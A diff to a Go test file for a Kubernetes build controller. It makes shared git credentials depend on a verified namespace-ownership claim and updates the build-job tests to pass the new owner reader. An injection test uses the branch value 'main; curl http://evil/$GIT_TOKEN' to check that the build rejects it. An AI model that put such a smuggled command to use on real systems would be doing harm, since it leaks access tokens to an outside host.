@@ -11,6 +11,9 @@ import (
 	"strings"
 	"testing"
 
+	crclient "sigs.k8s.io/controller-runtime/pkg/client"
+	crfake "sigs.k8s.io/controller-runtime/pkg/client/fake"
+
 	"github.com/stretchr/testify/assert"
 	"github.com/stretchr/testify/require"
 	batchv1 "k8s.io/api/batch/v1"
@@ -22,6 +25,7 @@ import (
 
 	kipperv1 "github.com/getkipper/kipper/console-api/api/v1alpha1"
 	"github.com/getkipper/kipper/console-api/internal/gitreach"
+	"github.com/getkipper/kipper/console-api/internal/nsowner"
 	"github.com/getkipper/kipper/controller/pkg/sharedcred"
 )
 
@@ -52,7 +56,7 @@ func TestCreateBuildJob(t *testing.T) {
 	client := buildFakeClient()
 	app := testApp()
 
-	job, err := CreateBuildJob(context.Background(), client, app, "abc123def456")
+	job, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "abc123def456")
 	require.NoError(t, err)
 
 	assert.Contains(t, job.Name, "my-app-build-", "the job name carries a readable app prefix")
@@ -121,7 +125,7 @@ func TestCreateBuildJob_CustomDockerfile(t *testing.T) {
 	app.Spec.Git.Context = "backend"
 	app.Spec.Git.BuildArgs = map[string]string{"NODE_ENV": "production"}
 
-	job, err := CreateBuildJob(context.Background(), client, app, "def789")
+	job, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "def789")
 	require.NoError(t, err)
 
 	kaniko := job.Spec.Template.Spec.InitContainers[2]
@@ -141,7 +145,7 @@ func TestCreateBuildJob_ChecksForInternalRegistryBase(t *testing.T) {
 	client := buildFakeClient()
 	app := testApp()
 
-	job, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	job, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "abc123")
 	require.NoError(t, err)
 
 	// A check-base init container runs between the clone and Kaniko, failing
@@ -167,7 +171,7 @@ func TestCreateBuildJob_ChecksForInternalRegistryBase(t *testing.T) {
 // when split across a backslash line-continuation; a public base must pass.
 func TestCheckBaseScript_Behaviour(t *testing.T) {
 	client := buildFakeClient()
-	job, err := CreateBuildJob(context.Background(), client, testApp(), "abc123")
+	job, err := CreateBuildJob(context.Background(), client, testOwners(t), testApp(), "abc123")
 	require.NoError(t, err)
 	script := job.Spec.Template.Spec.InitContainers[1].Command[2]
 
@@ -235,12 +239,33 @@ func managedNamespace() *corev1.Namespace {
 	return &corev1.Namespace{
 		ObjectMeta: metav1.ObjectMeta{
 			Name: "project-test",
+			UID:  "the-namespace",
 			Labels: map[string]string{
 				managedByLabel: managedByValue,
 				projectLabel:   "acme",
 			},
 		},
 	}
+}
+
+// claimingOwners is a reader in which project acme genuinely holds the
+// namespace, as a reconcile that ran would have recorded.
+//
+// The label on its own no longer answers who owns a namespace, because anyone
+// who can write a namespace can write that label and the answer decides which
+// project's shared credentials a build is handed. These fixtures now have to
+// say what a real cluster would: the project claims the object.
+func claimingOwners(t *testing.T) nsowner.Reader {
+	t.Helper()
+	return testOwners(t,
+		managedNamespace(),
+		&kipperv1.Project{
+			ObjectMeta: metav1.ObjectMeta{Name: "acme"},
+			Status: kipperv1.ProjectStatus{NamespaceClaims: []kipperv1.NamespaceClaim{
+				{Name: "project-test", UID: "the-namespace"},
+			}},
+		},
+	)
 }
 
 // sharedCredsSecret is the kipper-system list Secret the builder resolves a
@@ -266,7 +291,7 @@ func TestCreateBuildJob_SharedCredential_AllowedProject(t *testing.T) {
 	app := testApp() // clones from github.com
 	app.Spec.Git.CredentialsSecret = "shared-gh"
 
-	job, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	job, err := CreateBuildJob(context.Background(), client, claimingOwners(t), app, "abc123")
 	require.NoError(t, err)
 
 	// The shared token is staged from the kipper-system list, never copied into
@@ -292,7 +317,7 @@ func TestCreateBuildJob_SharedCredential_DeniedProject(t *testing.T) {
 	app := testApp()
 	app.Spec.Git.CredentialsSecret = "shared-gh"
 
-	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	_, err := CreateBuildJob(context.Background(), client, claimingOwners(t), app, "abc123")
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "not allowed for project")
 	// The build must not stage the token when denied.
@@ -310,7 +335,7 @@ func TestCreateBuildJob_SharedCredential_EmptyAllowListDenies(t *testing.T) {
 	app := testApp()
 	app.Spec.Git.CredentialsSecret = "shared-gh"
 
-	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	_, err := CreateBuildJob(context.Background(), client, claimingOwners(t), app, "abc123")
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "not allowed for project")
 }
@@ -326,7 +351,7 @@ func TestCreateBuildJob_SharedCredential_HostMismatch(t *testing.T) {
 	app := testApp() // clones from github.com, not gitlab.example.com
 	app.Spec.Git.CredentialsSecret = "shared-gl"
 
-	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	_, err := CreateBuildJob(context.Background(), client, claimingOwners(t), app, "abc123")
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "bound to")
 	assert.Nil(t, buildSecretByKey(t, client, app, "token"))
@@ -342,7 +367,7 @@ func TestCreateBuildJob_PerAppCredential_RejectsForeignSecret(t *testing.T) {
 	app := testApp()
 	app.Spec.Git.CredentialsSecret = "git-acme-tools" // not my-app-git-credentials, not in the shared list
 
-	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	_, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "abc123")
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "neither an allowed shared credential nor this app's own credential")
 	assert.Nil(t, buildSecretByKey(t, client, app, "token"), "a foreign tenant Secret must not be staged")
@@ -359,7 +384,7 @@ func TestCreateBuildJob_UnreadableSharedListFailsClosed(t *testing.T) {
 	app := testApp()
 	app.Spec.Git.CredentialsSecret = "my-app-git-credentials"
 
-	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	_, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "abc123")
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "verifying shared git credentials")
 }
@@ -376,8 +401,13 @@ func TestCreateBuildJob_SharedCredential_UnmanagedNamespaceFailsClosed(t *testin
 	app := testApp()
 	app.Spec.Git.CredentialsSecret = "shared-gh"
 
-	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
-	require.Error(t, err, "an unmanaged/unlabelled namespace must fail closed")
+	// The owner reader agrees the namespace belongs to nobody: no project
+	// claims it. That is the state an unlabelled namespace is in, and the one
+	// this test is about.
+	_, err := CreateBuildJob(context.Background(), client, testOwners(t,
+		&corev1.Namespace{ObjectMeta: metav1.ObjectMeta{Name: "project-test"}},
+	), app, "abc123")
+	require.Error(t, err, "a namespace no project claims must fail closed")
 }
 
 // TestCloneCredentialHelper_Behaviour runs the actual credential-helper shell
@@ -429,7 +459,7 @@ func TestCreateBuildJob_WithCredentials(t *testing.T) {
 	app := testApp()
 	app.Spec.Git.CredentialsSecret = "my-app-git-credentials"
 
-	job, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	job, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "abc123")
 	require.NoError(t, err)
 
 	// The token is read from the tenant namespace and staged as an ephemeral
@@ -541,7 +571,7 @@ func TestCreateBuildJob_ClusterRegistryCredIsolation(t *testing.T) {
 	client := buildFakeClient()
 	app := testApp()
 
-	job, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	job, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "abc123")
 	require.NoError(t, err)
 
 	// Kaniko runs the Dockerfile's RUN steps, so it must carry NO
@@ -601,7 +631,7 @@ func TestCreateBuildJob_FailsWithoutClusterRegistryCredential(t *testing.T) {
 	client := fake.NewClientset()
 	app := testApp()
 
-	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	_, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "abc123")
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "zot-push-credentials")
 }
@@ -641,7 +671,7 @@ func TestCreateBuildJob_RejectsInjection(t *testing.T) {
 	app := testApp()
 	app.Spec.Git.Branch = "main; curl http://evil/$GIT_TOKEN"
 
-	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	_, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "abc123")
 	require.Error(t, err)
 }
 
@@ -693,7 +723,7 @@ func TestCreateBuildJob_NoGitSource(t *testing.T) {
 	app := testApp()
 	app.Spec.Git = nil
 
-	_, err := CreateBuildJob(context.Background(), client, app, "abc123")
+	_, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "abc123")
 	assert.Error(t, err)
 	assert.Contains(t, err.Error(), "no git source configured")
 }
@@ -892,7 +922,7 @@ func TestCreateBuildJobRefusesASourceItCannotClone(t *testing.T) {
 	client := buildFakeClient()
 	app := testApp()
 
-	_, err := CreateBuildJob(context.Background(), client, app, "9f2c1a")
+	_, err := CreateBuildJob(context.Background(), client, testOwners(t), app, "9f2c1a")
 
 	require.Error(t, err)
 	assert.Contains(t, err.Error(), "access token")
@@ -911,7 +941,7 @@ func TestCreateBuildJobStillBuildsWhenTheCheckCannotComplete(t *testing.T) {
 	}
 	t.Cleanup(func() { ReachGit = original })
 
-	_, err := CreateBuildJob(context.Background(), buildFakeClient(), testApp(), "9f2c1a")
+	_, err := CreateBuildJob(context.Background(), buildFakeClient(), testOwners(t), testApp(), "9f2c1a")
 
 	require.NoError(t, err)
 }
@@ -930,7 +960,7 @@ func TestCreateBuildJobRefusesACredentialEmbeddedInTheURL(t *testing.T) {
 		app.Spec.Git.URL = embedded
 		app.Spec.Git.CredentialsSecret = ""
 
-		_, err := CreateBuildJob(context.Background(), buildFakeClient(), app, "9f2c1a")
+		_, err := CreateBuildJob(context.Background(), buildFakeClient(), testOwners(t), app, "9f2c1a")
 
 		require.Error(t, err, "%s was accepted", embedded)
 		assert.Contains(t, err.Error(), "username or password")
@@ -958,7 +988,7 @@ func TestResolveGitTokenRefusesAPerAppCredentialBoundElsewhere(t *testing.T) {
 		Data: map[string][]byte{"token": []byte("a-token-for-the-other-host")},
 	}
 
-	_, err := resolveGitToken(context.Background(), fake.NewClientset(secret), app, "git.example.com")
+	_, err := resolveGitToken(context.Background(), fake.NewClientset(secret), claimingOwners(t), app, "git.example.com")
 
 	require.Error(t, err, "a token bound to another host was offered to this one")
 	assert.Contains(t, err.Error(), "git.other.example.com")
@@ -979,8 +1009,25 @@ func TestResolveGitTokenAcceptsAPerAppCredentialWithNoRecordedBinding(t *testing
 		Data:       map[string][]byte{"token": []byte("a-token")},
 	}
 
-	token, err := resolveGitToken(context.Background(), fake.NewClientset(secret), app, "git.example.com")
+	token, err := resolveGitToken(context.Background(), fake.NewClientset(secret), claimingOwners(t), app, "git.example.com")
 
 	require.NoError(t, err)
 	assert.Equal(t, []byte("a-token"), token)
+}
+
+// testOwners is a namespace-owner reader for the build tests.
+//
+// CreateBuildJob consults it only when an app names a shared git credential,
+// so most of these pass an empty one. A test that does exercise the allow-list
+// gives it a namespace and the project that claims it.
+func testOwners(t *testing.T, objs ...crclient.Object) nsowner.Reader {
+	t.Helper()
+	scheme := runtime.NewScheme()
+	if err := kipperv1.AddToScheme(scheme); err != nil {
+		t.Fatalf("registering the kipper scheme: %v", err)
+	}
+	if err := corev1.AddToScheme(scheme); err != nil {
+		t.Fatalf("registering the core scheme: %v", err)
+	}
+	return crfake.NewClientBuilder().WithScheme(scheme).WithObjects(objs...).Build()
 }
